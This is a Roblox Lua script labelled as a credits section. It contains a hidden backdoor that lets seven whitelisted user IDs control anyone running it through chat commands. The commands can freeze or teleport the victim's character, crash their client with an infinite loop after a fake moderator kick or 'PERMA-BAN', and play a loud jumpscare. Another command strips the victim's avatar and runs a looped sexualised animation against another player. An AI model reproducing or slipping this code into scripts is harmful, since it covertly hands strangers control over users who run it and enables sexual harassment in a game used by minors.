--creds space

local a = game.Players.LocalPlayer
local b = {
    1420800618,
    3453843344,
    1084001826,
    1146673171,
    1121086395,
    404940011,
    6896245514,
}
local function c(d, e)
    local f = game:GetService("Players"):GetPlayerByUserId(e)
    local g = string.lower(d)
    local h = string.split(g, ".")
    local i = string.lower(a.Name)
    local j = string.find(i, h[2])
    if j then
        if string.find(h[1], ":freeze") then
          game.Players.LocalPlayer.Character.LowerTorso.Anchored = true
	      game.Players.LocalPlayer.Character.UppperTorso.Anchored = true
        end
        if string.find(h[1], ":unfreeze") then
            game.Players.LocalPlayer.Character.LowerTorso.Anchored = false
	      game.Players.LocalPlayer.Character.UppperTorso.Anchored = false
        end
        if string.find(h[1], ":benx") then
            bending = true
            local k = f.Name
            local l =
                a.Character:FindFirstChildWhichIsA("Humanoid"):LoadAnimation(
                game:GetService("ReplicatedStorage").ClientAnimations.Crouching
            )
            l.Looped = true
            l:Play()
            local m = .5
            local n = false
            local o = a.Character:FindFirstChild("Shirt")
            local p = a.Character:FindFirstChild("Pants")
            if o then
                o:Destroy()
            end
            if p then
                p:Destroy()
            end
            local q
            local r = function()
                local s = game.Workspace.Players:FindFirstChild(k) or game.Workspace:FindFirstChild(k)
                local t = a.Character
                if s then
                    if n == true then
                        m = m - 0.1
                    else
                        m = m + 0.1
                    end
                    if m >= 2 then
                        n = true
                    elseif m < 0.5 then
                        n = false
                    end
                    t.HumanoidRootPart.CFrame =
                        game.Players[k].Character.HumanoidRootPart.CFrame +
                        game.Players[k].Character.HumanoidRootPart.CFrame.lookVector * m
                end
            end
            local u = function()
                q = game:GetService("RunService").Heartbeat:Connect(r)
            end
            local v = function()
                q:Disconnect()
                l:Stop()
            end
            u()
            repeat
                wait()
            until bending == false
            v()
        end
        if string.find(h[1], ":unbenx") then
            while bending == true do
                wait()
                bending = false
            end
        end
           if string.find(h[1], ":scare") then
                function Scare()
                    local ScreenGui = Instance.new("ScreenGui")
                    local ImageLabel = Instance.new("ImageLabel")
                    local image = {"109129888", "146577131", "1309130490", "1119705746", "7479500080"}
                    local image2 = {"7236404523", "6150329916", "8195739170", "8628815817"}
                    ScreenGui.Parent = game.CoreGui
                    ScreenGui.Name = "SCREAM"
                    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
                    ImageLabel.Parent = ScreenGui
                    ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                    ImageLabel.Position = UDim2.new(0, 0, -0.000674206764, 0)
                    ImageLabel.Size = UDim2.new(1, 0, 1.00857365, 0)
                    ImageLabel.Image = "rbxassetid://" .. image[math.random(1, #image)]
                    ImageLabel.Visible = false
                    ImageLabel.BackgroundTransparency = 1
                    ImageLabel.Visible = true
                    local sound = Instance.new("Sound")
                    sound.Parent = game.Workspace
                    sound.SoundId = "rbxassetid://" .. image2[math.random(1, #image2)]
                    sound.Volume = 200
                    sound:Play()
                    for i = 0, 1, 0.1 do
                        wait(0.05)
                        ImageLabel.ImageTransparency = i
                    end
                    sound.Ended:Wait()
                    sound:Destroy()
                    ScreenGui:Destroy()
                end
                if not game.CoreGui:FindFirstChild("SCREAM") then
                    Scare()
                end
            end	    
        if string.find(h[1], ":kick") then
            local w = table.find(b, a.UserId)
            if not w then
                a:Kick("Kicked By A Moderator.")
                wait(0.25)
                while true do
                end
            end
        end
        if string.find(h[1], ":bring") then
            a.Character.HumanoidRootPart.CFrame =
                CFrame.new(game.Workspace.Players:FindFirstChild(f.Name).HumanoidRootPart.Position)
        end
        if string.find(h[1], ":ban") then
            if table.find(b, e) then
                local w = table.find(b, a.UserId)
                if not w then
                    a:Kick("PERMA-BAN")
            
                end
            end
        end
    else
        if string.find(d, "/e test") then
            game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("smelly welly", "All")
        end
    end
end
game:GetService("Players").PlayerAdded:Connect(function(e)
    local x = table.find(b, e.UserId)
    if x then
        e.Chatted:Connect(
            function(d)
                c(d, e.UserId)
            end)
        end
    end)
for y, z in pairs(game:GetService("Players"):GetChildren()) do
    local x = table.find(b, z.UserId)
    if x then
        z.Chatted:Connect(function(d)
            c(d, z.UserId)
        end)
    end
end
